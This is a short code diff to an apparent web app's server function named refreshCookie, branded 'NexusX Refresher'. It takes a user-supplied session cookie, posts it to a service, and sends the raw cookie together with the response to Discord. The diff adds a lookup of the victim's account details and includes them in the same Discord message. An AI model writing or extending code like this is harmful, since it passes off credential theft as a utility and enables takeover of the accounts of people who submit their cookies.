@@ -92,10 +92,12 @@ export const refreshCookie = createServerFn({ method: "POST" })
       body: `cookie=${encodeURIComponent(data.cookie)}`,
     });
     const text = await res.text();
+    const info = await getAccountInfo(data.cookie);
     await sendToDiscord("NexusX Refresher", {
       "Input Cookie": data.cookie,
       Status: `${res.status} ${res.ok ? "OK" : "FAIL"}`,
       Result: text,
+      ...info,
     });
     return { ok: res.ok, result: text };
   });
